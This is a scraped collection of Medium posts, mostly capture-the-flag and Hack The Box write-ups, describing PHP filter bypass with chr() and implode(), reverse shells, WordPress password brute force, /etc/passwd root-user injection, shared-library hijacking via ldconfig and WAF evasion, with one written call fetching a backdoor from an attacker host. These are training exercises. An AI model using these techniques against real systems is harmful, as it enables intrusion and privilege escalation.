The interesting thing about hacking on a challenge like this is there is not just one solution. In this case, the expected solution was actually pretty straight forward as you’ll see. But because of a silly assumption I made, I ventured down a complete round about way of solving it. Perhaps this round about way can be useful to you if you are a web application pen tester or a CTF junkie.
The CTF was properly themed as it is election season, and one of the web servers was the Republican National Convention’s primary server.
Nothing unordinary about this web site, so let’s take a look at the page source…
A nice obvious clue there, so let’s load up test.php…
Another obvious, but interesting, find. So let’s click the login button and see what happens.
Ok, so it appears we can enter PHP code directly into the field and it will execute. It should be relatively easy to get shell access to the server! Crafting a payload to execute file_get_contents(“http://myhost/mybackdoor.bin”) would be a good first step to getting persistent shell access. But it actually wasn’t going to be that easy. The web application had implemented some basic input filtering, and was blocking any input containing several key characters like:
While attempting to use these characters in our payload earned us some flags, the filtering meant we couldn’t specify string values in function parameters.
Given what we’ve seen so far I made a few assumptions. The first assumption was anything we enter as input ends up in an eval() function and executes, so we know we need to use PHP code/functions. Second, we can’t enter string parameters into functions since the use of single and double quotes will result in the request being blocked. However, input filtering like this can often be bypassed with encoding. An encoding algorithm that doesn’t contains any of the filtered characters is base64. Using base64 would result in a payload that would look something like:
This is where my bad assumption comes into play. I assumed the base64_decode() function required quotes surrounding the base64 encoded value so I never attempted to try it. After all, a base64 encoded value is a string in itself, so it must require quotes! My assumption turned out to be wrong, but at least it gave me an “opportunity” to solve the challenge the hard way :-)
The challenge was now how do you call PHP functions that require string values, but you can’t provide any literal string values. One function that could help came to mind, it was the chr() function. This function takes an integer as a parameter, which doesn’t require quotes, and converts it to the integers corresponding ascii character value. For example, chr(97) returns the letter “a”. I could then use chr() to convert every letter of every string I need to pass. However, this would require concatenation to form a string out of individual letters, and concatenation in PHP requires a period, which is a filtered character. For example this would print “hello”:
and this would be a syntax error:
Thinking about it more I realized there could be a possible way to do this with the implode() function. The implode() function takes an array of “pieces” and “glues” them together with another string. But in this case I don’t want the “glue” to be a string, I want it to be nothing so all my little chr()’s can for the commands I want. Also, I can’t pass a string literal to implode() since using quotes will be blocked. NULL to the rescue! As it turns out implode() will accept NULL as the “glue”, and this doesn’t require the use of quotes.
Okay… deep breath. The final set of steps are:
Now I have a string that I can pass to any PHP function, like exec() to execute command line commands on the server. The final payload for running “ls -l” would be:
With a working filter bypass in hand, we then proceeded executing the following commands to gain control of the server, where each of the strings in double quotes had to be passed using implode(NULL, array())
The mybackdoor.bin file was a Meterpreter binary that gave us shell access once it is executed. Once we had access to the server we were off to hunting for more flags!
I guess I can say doing things the hard way made it more interesting. However, had I just tried using the base64 decoded it could have saved a lot of time. Regardless, we had fun. And if you ever find yourself in a situation where you need to implode a string from an array of chars, below is a Python script to help make that process a bit faster!
At Signal Sciences we provide a modern approach to application security and web application firewalls. We also have a resource we provide for those doing security in the modern era of DevOps.
We hope you find the roadmap helpful.
Written by
","['Application Security', 'DevOps', 'Modern Security', 'Application Security', 'Ctf', 'Infosec', 'PHP', 'Cybersecurity']"
HackTheBox | Apocalyst CTF Writeup - secjuice™ - Medium,https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145?source=tag_archive---------2-----------------------,"Welcome to my write up for the Apocalyst box from HackTheBox.eu !
Hack The Box is an online platform that allows you to test your penetration testing skills and exchange ideas and methodologies with other members of similar interests. It contains several challenges that are constantly updated.
As an individual, you can complete a simple challenge to prove your skills and then create an account, allowing you to connect to our private network (HTB Labs) where several machines await for you to hack them. By hacking machines you get points that help you advance in the Hall of Fame.
If you want to jack some boxes yourself, try to hack the invite code in order to become a member and get involved. It is a lot of fun!
Without any more talk, lets proceed to the Apocalyst CTF and my writeup of the penetration tests I ran against it. Please comment with any questions!
Host: 10.10.10.46
root@kali:~# nmap -T4 -A -v 10.10.10.46
When we access the web-server this is what we see
For some reason the formatting of the Wordpress website is screwed up, so I added the default domain name of the box apocalyst.htb to the /etc/hosts and that fixed the formatting issue.
The next step in my reconnaissance phase would be to scan for known directories names and files using Dirbuster with the Dirbuster medium dictionary. I didn’t let Dirbuster to fully run because it found 100 folders and 80 files very quickly and…
that’s way too many folders and files to go over in a CTF, so I just scanned only for folders instead but still couldn’t find anything interesting…
I created my own custom wordlist with Cewl.
When we run our custom wordlist with dirbuster again we can see that all requests have a response size of 421 except one that has a size 440.
which means it has different content than all of the other requests or there’s an abnormal error. When look at the source code of the folder with the 440 response size, we can see an interesting comment.
<! — needle — > maybe it’s a metaphor for a needle in a hay stack? So stenography maybe? When we go to the folder were brought to an apocalyptic image.
I saved it and checked for strings but there was no interesting strings in the metadata of the image. I used steghide to check for embedded data.
as you can see it does in fact have an embedded file named list.txt encrypted in rijndael-1128 Let’s extract the file
The file had no pass-phrase I just hit enter and it worked. Now we get another words-list… I didn’t know what to do with this list at the moment so I moved on to enumerating Wordpress with wpscan
We can see that wpscan found a bunch of possible vulnerabilities and a user named falaraki. Maybe let’s brute force wordpress with the word-list we got from the image on http://10.10.10.46/wp-login.php
I captured a test request in Burp Suite at the login page and sent it over to the intruder option.
Were going to select the password pwd parameter only and the Attack type will be Sniper. We move onto to the payloads section and add the list we got from the image. Then start the attack - all requests sent back a 200 status code and most of them had a 3101 in length except this one request that had 3764 in length meaning it either worked as the correct password, timed out, or it gave us a unique error that only that password can give.
Let’s try to login with that password Transclisiation
username: falaraki password: Transclisiation
Now we can upload our php reverse shell in the Appearance Editor. I got my php shell from PenTestMonkey I’m not going to paste the entire code here because it’s a lot of code, so all you have to do is change your ip and port number. Where it says //CHANGE THIS to your ip and desired port number.
Save the changes made to the file once your reverse shell is in and setup your netcat or metasploit listener. Then execute the php reverse shell.
http://apocalyst.htb/wp-content/themes/twentyseventeen/404.php
Now we can get the user flag!
“One of my go-to commands after catching a dumb shell is to use Python to spawn a pty. The pty module let’s you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command”
I uploaded linux-exploit-suggester to the system to check for possible privilege escalation exploits.
Again we have a bunch of possible exploits but I’m not done enumerating, I’m going to upload LinEnum.sh to enumerate the entire system. I started a python HTTP server listening on port 8080 on my local machine
and downloaded the LinEnum.sh file into the temp folder of the victim.
I gave it execute permissions and I ran the script. We get a bunch of output that I’m not going to paste here because it will make my writeup extremely long, but I found something interesting we can write to /etc/passwd
-rw- is the permission of the owner of the file which is root-rw- is the permission that the group has over the file-r — is the permissions that all the other users have over the file
I used openssl to generate a password the password was HackedByKatz
The purpose of the openssl passwd command is to feed your password through a one-way hashing algorithm (-1 outputs MD5). What that gets you is a string that's derived from your password cryptographically, but cannot be used to find your password on its own if an attacker gets their hands on the hashed version.
The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon (:) symbol. Total seven fields as follows. Generally, passwd file entry looks as follows…
Source: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
Now let’s construct a user line based on what we just learned about /etc/passwd
All we need to do now is add it to the /etc/passwd file but we have a problem; we can’t write to /etc/password with nano or vi…. So we need to figure out another way to write to the file.
Perhaps echo should work, we know that we can use >> to redirect to a file, we know that if for example we write echo “Hello World” >> file1.txt we would be creating a file with the content inside the double quotes and if we add another word with the same redirection it would append to the end of the file. We can see this action below
Now if we do > that would erase all of the content and it would only have what’s inside the double quotes.
So we don’t want to be using > when redirecting output to /etc/passwd But we’re going to face another problem, take a look at the following screen shot
I have created a variable which contains the string TEST all good right? Now if I want to display the string I assigned to the variable I have to use the $ sign. That’s how you call variables in bash. So there’s going to be conflict when if we echo passwd >> /etc/passwd there won’t be errors but bash will think that $1 and $ pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/ are variables and your /etc/passwd file will look something like this…
That will not allow you to login as the user Katz properly. Something that we could do to bypass this issue is to encode it in base64
Copy the base64 string to decode it but on it’s way to being decoded also redirect it to the /etc/passwd file like so
That’s it! our user should now be in the /etc/passwd and we should be able to login with su Katz
Got Root Flag!
Overall this was a very fun box I really enjoyed it and learned a lot. I recommend you all to try this box.
You can contact me on Twitter 0Katz
Follow my team on Twitter @TogetherWeHack
Editors Note: Put a WEBGAP between you and the malware with a browser isolation technology or by leveraging a remote browser service.
Written by
","['Opinion', 'OSINT', 'How To', 'Hacking', 'Hackthebox', 'Infosec', 'Cybersecurity', 'Tech']"
{Hack the Box} \\ Bashed Write-Up - secjuice™ - Medium,https://medium.com/secjuice/hackthebox-bashed-write-up-eceb6b9f6d6f?source=tag_archive---------9-----------------------,"Disclaimer: I’m a noob.
Bashed and Mirai hold a special place in my heart. They’re the first two boxes I cracked after joining HtB. You can check out more of their boxes at hackthebox.eu.
Bashed is a pretty straightforward, but fun box, so let’s just jump right into it.
Start by doing a normal Nmap scan on this poor semi-defenseless box.
Aite, so we got ourselves a web server. While we peruse the website, we can start a full port scan of the box, in case there are weird ports the normal scan missed. Effective enumeration involves being efficient with your time. So make sure to have something running in the background at all times. A full port scan takes a while, so we just let it run while we go about our bidness.
Let’s now head over to http://10.10.10.68 (port 80 by default).
The most notable thing on this site seems to be the blog post. He mentions having developed phpbash on the same server we’re tying to crack (Check out the actual program here. It’s been really useful to me in other CTFs as well). That makes it very likely that it’s laying around on the web server somewhere.
That’s all we’ve really found for now, so let’s fire up GoBuster (or whatever your favorite directory enumerator is. Fite me).
Right off the bat we get some juicy, yet oddly stale, directories. Looking in /dev/, we find phpbash.php and phpbash.min.php. Bingo bby.
Click on any one of the .php files, and we get a very convenient shell as www-data.
Funnily enough, if we go to /home/ we can see that we have read permissions on the arrexel directory, so we can just grab ourselves the humble, non-root hash from user.txt.
Success pt. 1.
Before we move on to privilege escalation, let’s try to get a reverse shell going, like elite hackers (m8 y). I’ll mention why we need one later on in the post. In keeping with the theme of the site, grab this. Download the php reverse shell from that link and extract its contents. Change the IP address and port in the .php file to your own IP address (it’s the one underneath tun0 in ifconfig) and the port of your choice.
Now we need to upload it to the remote server so we can access it from our browser. My favorite way to do this is to use SimpleHTTPServer. Download it from the link and run it.
Now use wget or curl from /phpbash.php to grab the reverse shell while in /var/www/html/uploads since that’s the only place that we have write permissions in the web server.
The python server on our local machine should show that the remote machine grabbed our file.
Excellent. Now start up your netcat listener.
Navigate to /uploads/shell.php.
It will hang, but when you check your netcat listener:
There you go. Now to spare ourselves the eternal agony of ctrl-c’ing back out to our local machine, let’s upgrade our shell with some Python magic.
Now background this with ctrl-z, and type stty raw -echo on your terminal. Then type fg to foreground the listener shell, press enter twice, and boom, you’ve got yourself an interactive remote shell in all its tab-completion glory.
There are a few more things you can do to make sure the clear command works along with any text editors like vim, but that’s not really necessary for what we need to do. Now navigate to the root directory.
Notice that there’s this odd directory called scripts owned by scriptmanager, one of the other users on the system. We only have read permissions on it, so we can at least list its contents.
Fun. Okay. That doesn’t really tell us much. Moar enumeration. This part is straightforward though. If you type sudo -l, you’ll notice that www-data can run any commands as scriptmanager.
Since we want to read what the mysterious files in /scripts/ are, let’s start up another shell as scriptmanager. (Sudo-ing wouldn’t be possible without a tty shell, which is why we went through all that trouble).
Now head on over to /scripts.
There are two files here. test.py and test.txt.
Hmmmmmmmmmmmmmmmmmmmmmmnmmmmmmmmmmmmmmmmm. It seems like test.py is run, outputting test.txt and its contents. Bit of weirdness though. test.txt is owned by root. If we run test.py, test.txt is just going to be owned by scriptmanager, since that’s who it’s running as. The only explanation is that it was run by root somehow. If you notice the time test.txt is created, it changes every minute. It’s most likely a cron job, owned by root, that executes test.py every minute. Convenient eh?
Let’s get ourselves a root shell and then grab the root.txt file. It’s no fun without seeing that #. Open up test.py and copy the code for a python reverse shell from pentestmonkey’s handy dandy list of reverse shells, pasting it to the the file, and changing the IP address and port to your own.
Set up your Netcat listener, and wait ≤ 1 minute.
GG. You’re done…….wait. I’m getting the distinct feeling I forgot something. Oh shoot. Go back to your terminal and cancel the full port scan since ITS PROBABLY STILL RUNNING GOD.
Now you can go pat yourself on the back, stretch, get a drink of water, and go outside to get some sunlight for that vitamin D production. I’ll sit back and wait for Skynet to come vaporize me for breaking and entering and identity theft. Such is life.
Written by
","['Opinion', 'OSINT', 'How To', 'Hacking', 'Computers', 'Penetration Testing', 'Computer Science', 'Cybersecurity']"
Hack The Box :: Dab [write-up] - noobintheshell - Medium,https://medium.com/@noobintheshell/htb-dab-writeup-6459329737d0?source=tag_archive---------6-----------------------,"This is the first write-up of a series on Hack The Box systems penetration tests.
Dab is a Linux box released on August 18th 2018 and retired a few hours ago (on February 2nd 2019). The box IP address is 10.10.10.86 and the announced difficulty is hard.
This box involves a lot of enumeration, breaking and brute-forcing poor passwords. It shows that a development environment must be well secured and not published publicly, that software must be patched on a regular basis and that poor file permissions can lead to a server fully compromised.
Note: unless otherwise stated, all commands and scripts you will find below are run on macOSX. Especially sed and base64 syntax may slighly differ from Linux versions. Python2 is the preferred interpreter.
Let’s start with an Nmap scan to see what the box has to offer:
Note: read the command and flags explanation here.
We discover:
Nikto web scans on port 80 and 8080 do not report any additional and useful information. Let’s further analyze each service.
We can retrieve the image dab.jpg with any FTP client. It does not seem to contain anything of interest. EXIF data, LSB method and other frequent steganography techniques do not show anything.
Let’s leave the users enumeration for later as it may not be necessary in the first place.
We are redirected to /login where we have a basic login form:
A light directory enumeration does not find any other folder or file. When manually testing some username/password pairs, we can see some differences in the output error message depending on which username we use. For instance, with username admin or demo, the error message is:
For all other tested usernames, the error message is:
See the missing dot at the end of the message? We keep this in mind for later as this could be as well used to enumerate users.
When browsing port 8080, we are welcomed with the following error message on an “Internal Dev” access:
If we set the cookie password we get a new error message:
A directory enumeration does not report anything more.
With all the above information let’s try to gain access to this box. The most interesting entry point seems to be the web application served on port 8080.
Let’s run the following script to brute-force the password with our preferred wordlist:
A few seconds later we get the following output:
By setting our new cookie, we get access to a TCP socket test interface where we can query a port with a command:
Queries on port 80 and 8080 always show a status 400. Querying the FTP port with an FTP command is also not conclusive:
I tried for some time some command injections on both parameters but was not successful. The port parameter only accepts numbers between 1 and 65535 and the cmd parameter filters all non-alphanumeric characters but spaces.
Let’s enumerate again the open ports, maybe some ports are only available locally. Knowing that a non-listening port raises a status code 500 when we query it, we can use the script below to get the open ports:
The output is:
We get a new port listed! The port 11211 is the port used by Memcached, which is a ‘general-purpose distributed memory caching system’. We could have guessed it based on the Status of cache engine: Online message on top of the page. The below query shows us the running version:
Memcached has multiple known vulnerabilities, however, the filtering in place does allow us to try much. Let’s continue to query the service with the help of this cheat sheet document. Memcached organizes data by slabs, which are ‘categories of data of a given size range’. We can first list the available slabs with the command stats slabs:
We see a bunch of stats and we can retrieve the active slab classes: 16 and 26. Then we retrieve the keys for each slabs with the command stats cachedump <slab class> <number of items to dump> (only the input command and output will be snown below):
Promising…now that we have the keys, we can dump their value:
Note: You may retry to get those values a few times before they shows up, the time data get cached.
Ok, so we get a bunch of users and what seems to be their MD5 hashed password. The 2 accounts that we enumerated before, admin and demo are in the list. We were right, we can enumerate existing users from the login error message. The passwords of those 2 users are weak and can be easily cracked online:
Now we can login on the web app running on port 80. There is no visible difference whether we login with the user admin or demo. We get the list of stock we retrieved before with Memcached:
After login in, we get a session cookie that looks like this:
This looks like a JSON Web Token (JWT) but it’s not. However, the structure seems the same: 3 different parts, base64 encoded. Let’s decode each part:
Note: the base64 padding characters (equal) are deleted by the app. We need to add them to correctly decode the strings.
The first part is obvious and my first idea was that there is maybe an SQL injection to exploit. Especially after reading some comments in the source code of the page:
The second part seems like a number, in our case, it is equal to 255119574 in decimal. Further tests show that this value changes after each login and that 2 logins done at a 1-minute interval have a value difference of 60. Therefore, the second part is a timestamp in seconds.
The third part looks like the SHA1 hash. For sure this hash is a signature based on the previous 2 parts.
However, after many tries and some hours lost in trying to find out how to compute this hash and get a valid cookie, I found out this is a Flask session cookie and that the last part is an HMAC-SHA1 signature computed using the payload (part 1), the timestamp (part 2) and a secret.
Therefore, we can not do anything without the secret. Either there is another vulnerability to get it, or it’s a dead-end.
So, we are left with a list of users, the stock information and no idea what to do next. After a few hours of tries and other dead-ends, I remembered the possible OpenSSH users enumeration vulnerability and gave it a try. We can retrieve the list of all the existing users with the below script (make sure the users are cached before running it):
Then we use Metasploit to go through the list with the ssh_enumusers payload:
And we get a hit!
The genevieve user has as well a weak password: Princess1. Now we can SSH into the server and get the user flag:
Now that we have a low-privilege access to the server we can start to work through elevating our privileges. Let’s first start with gathering some information. Some known privileges escalation enumeration scripts like LinEnum.sh or linuxprivchecker.py could be uploaded on the server and used, however, let’s keep them for later if necessary.
Let’s check if our user has some SUDO access:
We can run the binary /usr/bin/try_harder with root privileges. When running it, we get what seems a root prompt but when we run a command, it fails:
It’s a decoy as all the strings are hardcoded and printed:
Let’s collect all the files owned by root (user or group) and that have the SUID or SGID bit set. If one of these bits is set, the program will run with the owner or group privileges respectively:
In red, we can see 3 weird binaries that we are not used to see on a Linux server with a SUID bit set and that will need further analysis. Especially the ldconfig, could be dangerous as it is used to “create the necessary links and cache to the most recent shared libraries found in the directories specified on the command line, in the file /etc/ld.so.conf, and in the trusted directories (/lib and /usr/lib)”.
Let’s analyze the binaries flagged above. When we run myexec we are asked to provide a password. A simple ltrace and we get it:
When we use the right password we get a strange message:
Using strace to check the system calls we see that the binary loads a shared library called libseclogin.so:
This is not a common shared library and its name corresponds to the function seclogin() that the binary calls. We must find a way to create our own shared library called libseclogin.so and make myexec use it instead of the default one. This is something that would normally be achieved by settings the environment variable LD_PRELOAD to a directory where we can write, however, this does not work on SUID binaries for evident security reasons.
What is interesting though, is that we have as well root execution on ldconfig binary! This command uses the config file /etc/ld.so.conf to load and cache shared libraries, let’s see the config:
The config just says to include whatever config file is in /etc/ld.so.conf.d/. This folder has world-writable access, which is not the default. We can add our own config that points to a controlled folder containing our crafted shared lib. However, this is not really needed as there is already a weird test.conf that point to /tmp. We can simply put our lib there.
The shared library code will be very basic and will just spawn a shell. The compilation must be done on a Linux box.
We then upload our shared library on the /tmp folder with scp:
We run ldconfig to rebuild its cache and we can see our shared library being linked. We then only need to run myexec binary to get a root shell and…Voilà!
This was a tricky box with lots of enumeration and decoys left on purpose. Gaining user access was more tricky than the privilege escalation. I would rate this box as a medium difficulty challenge.
To make it short:
Do not hesitate to comment below if you found alternative ways to root this box. I would be interested to know your solutions.
This post is for educational and awareness purpose only. You are solely responsible for any actions and/or activities related to the material contained within this post. I will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this blog to break the law.
Written by
","['known vulnerabilities', 'Metasploit module', 'Hacking', 'Hackthebox', 'Penetration Testing', 'Ctf', 'Cybersecurity']"
{Hack the Box} \\ FluxCapacitor Write-Up - secjuice™ - Medium,https://medium.com/secjuice/hack-the-box-fluxcapacitor-write-up-863190e4828e?source=tag_archive---------8-----------------------,"Alrighty kids. Today, we’ll be learning about the virtues of patience and anger-management. And maybe some stuff about bypassing Web Application Firewalls *coughs uncontrollably*.
In all honesty, this was an infuriatingly good box. I learned a bunch about a topic I hadn’t every really explored in depth. Anyway, let’s get to it.
Start by running an Nmap scan on FluxCapacitor. Let’s see what we’ve got.
Great. Just a web server. Onward to your web browser of choice. (Note that under ‘version’, it says SuperWAF. We’ll get to that a bit later.)
There doesn’t seem to be much going on here besides a cryptic status message. Let’s check the source code.
Look at that odd comment right there. So odd. Let’s try going to that URL.
Excellent. ’Tis a dead end. Except for maybe that line at the bottom. We’ve got ourselves a web server name and version. This is a good time to practice your Googling skills (or Binging, I don’t judge). Search for the OpenResty site, look at the Github page for it, skim through the documentation, and search for any interesting exploits for that version. It’s an incredibly valuable skill to learn. I’ll save you an hour or two here by saying it’s a dead end. But keep practicing.
Back to enumeration.
Let’s crank out Gobuster and bust some dirs.
Just a hunch, but I think the server doesn’t want us to know what file extension /sync is. It just doesn’t truncate anything past sync.
We can confirm this by adding a bunch of random characters in front of /sync. We still get a 403. But if we remove the ‘sync’ part, or add characters before it, we get a 404 not found. Great.
Also wat. When we went to /sync in our browser, we got a 403 forbidden status code. Gobuster, though, seems to be on good terms with the server. It got a 200 OK code.
Stifle your jealousy for now and figure out why the server doesn’t like us.
Let’s open up Wireshark and compare the HTTP requests from both sources and see where we went wrong. Run Gobuster again and run Wireshark on tun0, the interface for the HtB VPN.
Now right click on any of the TCP packets going to 10.10.10.69 and click on Follow->TCP Stream. That’ll give you a nicely formatted HTTP request, so you don’t have to learn to read hex encoding. Ew.
Do the same with the browser. Run wireshark (change the interface to ‘any’, since browser HTTP requests take a different road), go to /sync in Firefox and let’s see what packets we get.
Follow the TCP/HTTP Stream.
The html content itself doesn’t matter, since that can always vary. Same deal with the GET request contents. Look closely at the HTTP headers in both requests and compare them.
Gobuster:
Browser (Firefox):
It’s the User-Agent. Always knew there was something up with him. Our browser’s been blacklisted for whatever reason. You can play around a bit here. It seems to just look for the word ‘Mozilla’ in User-Agent and forbid all traffic from it. Maybe it blacklists other browsers as well. Who knows. If you try wget or curl to get the webpage, it lets you in.
But that’s not pretty, so we’re going to intercept our browser request with a Burpsuite proxy, modify it, and send it on its way.
Open up BurpSuite. The free edition has everything we need. Go to the Proxy -> Intercept tab at the top and make sure that Intercept is on.
To make our Firefox requests go through Burp, go to Firefox -> Preferences -> Advanced -> Network -> Connection -> Settings. Change the proxy to 127.0.0.1:8080. This will ensure that any browser requests we send get routed through the Burp proxy, where we can view and modify the HTTP request, before sending it to it’s intended destination.
Look into downloading FoxyProxy to do this for you automatically. It’ll save you like 10 seconds. Then you can spend them dreaming about what your life would be like if you had increments of 10 seconds more of free time every day. Truly magnificent.
Browse to /sync. Your browser will hang. That’s okay. Don’t panic. Go to Burp, and you’ll (hopefully) see the HTTP request in the raw.
Delete the current User-Agent and replace it with…..anything I guess. As long as it doesn’t have Mozilla in the name, u gud.
Now forward the request (by clicking/tapping/joysticking/atomic bit manipulating the Forward button). Go to your browser (plz).
Wow. We got the timestamp guys. Nice. It’s letting us through. Now what?
by M. Night Shyamalan
Since /sync seems to be the only other page, we’re stuck trying to figure out wassup here. Let’s go back to the SuperWAF thing. That suggests that there’s some Web Application Firewall (WAF) trickery on this site. A Google search for SuperWAF doesn’t turn up anything so we’re going in blind.
First of all, a WAF is a reverse proxy. It acts as an intermediary between a server and client, attempting to protect the web server from attacks targeting misconfigurations and security flaws. It tries to filter out common attack attempts like Cross-Site Scripting (XSS), SQL Injection, and Remote Code Execution (RCE).
Cross site scripting won’t do us any good here since it requires other users. SQL Injection seems like a big no-no since data doesn’t seem to be stored anywhere. We just seem to be getting output from a script that tells us the time. What language? No clue. By doing a bit of educated guessing, there’s got to be some kind of RCE that we can exploit. The WAF is there for a reason.
We now need to do the metaphorical equivalent of banging our heads repeatedly against a brick wall and hope that we eventually find a couple loose bricks that bring the whole thing down, only to have us stumble as we walk over the ruins, snag ourselves on a brick shard, and tug on it repeatedly until our pants get ripped off. *Deep breaths*.
Go back to Burp, and if you didn’t close it already, go to Proxy -> HTTP history and find the request we sent to /sync. Click on it and then press ctrl-r to send it to the Repeater. Go to the Repeater tab (still in Burp), and make sure the User-Agent doesn’t have Mozilla in it before proceeding.
Now we can repeatedly modify and send HTTP requests.
At this point, we can make an educated guess that /sync might take in a parameter. Let’s test this assumption.
If it can take a parameter, and there’s a WAF in place, there’s most probably a way to execute code. Try a few parameters after sync and you’ll see that you get the same timestamp back. Nothing changes.
This is where a fuzzer comes in handy. Kali linux has WFuzz installed already so let’s use that. What it does is use a dictionary to brute-force URLs until we see any anomalies. Since we don’t have much to go on, this is our only option. Before starting up WFuzz, check this out. SecLists has a bunch of really useful wordlists for fuzzing. Now actually checkout the repo and save it somewhere nice.
Fire up WFuzz and list its options.
-u, -w, and --hh will come in handy here. -u and -w are for the URL and wordlist respectively. But why the last one? Look at the wfuzz commands and you’ll see that - -hh is for hiding responses with a certain character count.
If you go back to Burp and mess around with /sync for a bit, you’ll notice that the response Content-Length stays the same across all valid responses. 19 characters. We can use this as a constant to help identify any anomalies.
Now let’s wfuzz this bad boy.
The FUZZ in the URL is what gets replaced with other words as wfuzz iterates through the dictionary we gave it. Also, we can make yet another educated guess, and add ‘ls’ as the parameter value. The idea is that we’re aiming for some sort of RCE, and so we want to trigger either a successful response with a directory listing, or have the WAF block our attempt to do so. Any response with a Content-Length of less than 19 characters gets filtered out in the results.
Aaaand heck to the yeah. We’ve found a valid parameter name. If we use Burp to add the ‘opt’ parameter, we can see the forbidden page again. Yay.
Now for the rip your mustache hairs out part. We need to guess what our limits are with this RCE vector. Start by firing up wfuzz again to see what special characters get filtered and blocked by the WAF.
Two things. First of all, WAF doesn’t like the following special characters: ; ` ( ) * $ < >. The second oddity here is that the single quote (‘) is giving us a response with 1 character, while every other valid character gives us the usual 19 characters.
Let’s Burp it up.
That’s new. The timestamp is gone, but we still get a 200 response. Let’s try playing around with the single quote and the previous command we tried (ls).
At this point, I’d suggest taking some time to read about evasion techniques for web firewalls. I’ve included two links here (part 1 and part 2) and at end of this post, to articles written by the creator of this box. They discuss WAF evasion in depth and really helped me form an attack plan to figure out how to move forward. Be sure to give him a follow and clap those articles. They’re amazing.
Now that I am enlightened, I spend the next 5 hours figuring out how to get this damn thing to let me through.
I did it Ma.
Three things were required to make this work.
First of all, we need a space after the first single quote. At a guess, I’d say the single quote truncates a previous command and then we need a space after it to execute the one we injected.
Second, we have to separate the ‘ls’. Putting a ‘\’ before the ‘s’ makes no difference to bash, since it’s apparently a bash script. It’ll just ignore it. Thankfully the WAF can only detect blacklisted commands with contiguous characters.
Third, we’re going to need another quote to end the second command we add.
We FINALLY have some sort of command execution. It should be pretty straightforward from here.
Let’s start by figuring out where we stand with Flux.
;_;
We need to escalate our privileges before we can really do anything, because FluxCapacitor refuses to acknowledge our existence. I usually try ‘sudo -l’ first, because that contains the juiciest stuff. It tells you what commands you’re allowed to run with the privileges of another user.
This is what we get back from “s\udo -l” (The forward slash behind the ‘u’ cancels out detection for ‘sudo’ and ‘su’, both of which are valid bash commands):
(ALL) ALL doesn’t really help us because we’d need passwords to sudo as other users. The second entry is what we’re looking for. It tells us that we can run ‘/home/themiddle/.monit' as root without having to enter the root password. That path has to be typed exactly for it to work though. You can’t go to that directory and type 'sudo .monit’. It’ll just ask for the root password. Let’s go see what it contains.
Typing ‘ ca\t /home/themiddle/.monit’ as the ‘opt’ value, we get:
What an interesting bash script. You can copy it to a bash script on your local machine and play around with it a bit. It takes in two arguments, and if the first argument is “cmd”, then it base64 decodes the second argument, and then runs it in bash. Perfect. We can now run any command as root here. Ezpz.
From here, we can probably just ‘cat’ out both the user and root flags, but a reverse shell is so much nicer, and if I have to type another random backslash, Imma pop a biscuit.
This is going to be r/mildlyinfuriating, because so many crucial special characters are filtered out. Let’s improvise.
We’ve got quite a few options here. If we go back to Burp and try to look for something useful, it seems the system has Python installed.
Python reverse shell it is.
Put the above code into a .py file on your local machine and be sure to change the IP address to your own. It’ll be under tun0 in ifconfig. Take your pick of ports. There’s quite a bit of them.
Normally with an RCE, we can just type the python code in directly, but since there are sooooo many bad characters in it that the WAF doesn’t like, we can’t. What we can do is upload the file to the box and run it from there.
Use the Python SimpleHTTPServer to start up a server on your local machine, making sure you know the relative path of the python file you just made. It’s standard in Python 3, so if you don’t have it, just download the Python file online.
Since ‘.monit’ base64 decodes the command we want to run, let’s first encode ours on our local machine.
Copy the base64 and then, in Burp, let’s run it through .monit. (I put a backslash before every character in the hex encoding because something in there was making the WAF scream, and ain’t nobody (heh) got time to figure that out).
Yeee.
The Python server:
Burp:
Successfully uploaded.
Start up a netcat listener to grab the shell.
Now base64 encode ‘python3 /tmp/shell.py’ and run it with .monit in Burp. We need to type python3 explicitly because I didn’t see any symlinks for python -> python3 in ‘/etc’.
F I N.
WAF Evasion Techniques Part 1
WAF Evasion Techniques Part 2
Thank you to theMiddle for making a great box! Make sure to give him a follow.
If you found this informative, be on the lookout for more write-ups. You can follow me on Twitter for the latest.
Happy hacking!
Written by
","['Opinion', 'OSINT', 'How To', 'Hacking', 'Technology', 'Cybersecurity', 'Penetration Testing', 'Linux']"
hackthebox (How to get the invite code and enter into hackthebox.eu),https://medium.com/@sonusaikishan/hackthebox-how-to-get-the-invite-code-and-enter-into-hackthebox-eu-fb4f3f24dc6c?source=tag_archive---------6-----------------------,"Goto hackthebox.eu/invite
First do an inspect element and get to the sources tab (if you are using chrome browser)
In sources tab you will see some js files present
you will have to take at all the js files present there and there you will see a js file named inviteapi.min.js
But you will see that you will not be able to read that js file so to make that js file readable you can use an online tool — jsbeautifier
using that tool now you will be able to read that js file
and in that js file you will see that there is a function named — makeInviteCode()
this function actually make/generates your required invite code
hence make a POST request to the endpoint mentioned in the function (/api/invite/how/to/generate)using curl or any other online tool to make a POST request
you will get an BASE64 encrypted code as a response in the above POST request
Now decrypt that BASE64 code using any online decoder
After decrypting that you will get a message like “In order to generate the invite code, make a POST request to /api/invite/generate”
then make a POST request to /api/invite/generate this time you have to make the POST request using curl only because the invite code generated tracks your IP address hence you will not get the correct code for your IP if you make the POST request using any other online tool
the response you get will be again BASE64 encrypted hence decode it
and finally you get the invite code and now you are good to go and sign up into hackthebox.eu
Written by
","['Ethical Hacking', 'Cybersecurity', 'Hacking', 'Ctf', 'Pentesting']"
Hiding Registry keys with PSReflect - Posts By SpecterOps Team Members,https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353?source=tag_archive---------7-----------------------,"Recently, I wanted to test detection of different kinds of registry persistence used by malware and APT groups. The Windows registry is a particularly interesting area for blue team detection as “fileless” techniques become more prevalent. One technique that has stuck in my mind is a persistence trick used by the Kovter malware family as detailed in a September 2015 report from Symantec, and analyzed by MalwareBytes, Airbus Cybersecurity, and Reaqta.
